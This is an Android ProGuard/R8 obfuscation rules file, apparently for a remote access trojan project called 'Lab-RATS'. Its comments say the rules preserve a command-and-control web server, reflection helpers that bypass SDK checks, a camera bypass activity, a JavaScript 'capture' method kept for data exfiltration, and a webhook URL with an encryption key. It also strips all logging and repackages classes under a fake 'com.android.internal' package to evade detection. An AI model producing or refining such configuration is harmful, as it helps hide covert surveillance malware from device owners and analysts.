# Deep Stealth Optimization Rules for Lab-RATS

# 1. Core Web Server (NanoHTTPD) - Required for C2 functionality
-keep class fi.iki.elonen.** { *; }

# 2. WebSocket Protocols
-keep class org.java_websocket.** { *; }

# 3. JSON Serialization (Gson)
-keep class com.google.gson.** { *; }
-keepattributes Signature
-keepattributes *Annotation*
-keepattributes EnclosingMethod
-keepattributes InnerClasses

# 4. Internal Reflection Targets (Hardened Helpers)
# These must be kept because they are called via Class.forName() to bypass SDK checks
-keep class com.labs.labrats.Api24Helper { *; }
-keep class com.labs.labrats.Api30Helper { *; }
-keep class com.labs.labrats.CameraHelper$BypassActivity { *; }

# 5. JavaScript Interface (Shadow Overlay)
# Ensures that the 'capture' method survives obfuscation for data exfiltration
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# 6. Build-Time Configuration (Persistence)
-keepclassmembers class com.labs.labrats.BuildConfig {
    public static final String WEBHOOK_URL;
    public static final String ENCRYPTION_KEY;
}

# 7. System Entry Points (R8 will automatically keep what's in AndroidManifest.xml)
# We don't use broad -keep for Services/Receivers to allow renaming of the classes themselves
# when they are NOT referenced by hardcoded strings elsewhere.

# 8. Aggressive Code Stripping (Log Removal)
# This removes plain-text strings and execution paths for system logging
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

# 9. Deep Obfuscation Settings
-optimizationpasses 5
-allowaccessmodification
-repackageclasses 'com.android.internal.stability'
-flattenpackagehierarchy
-overloadaggressively

# Use a custom dictionary for even more confusing names (optional/future)
# -obfuscationdictionary dictionary.txt
# -classobfuscationdictionary dictionary.txt
# -packageobfuscationdictionary dictionary.txt
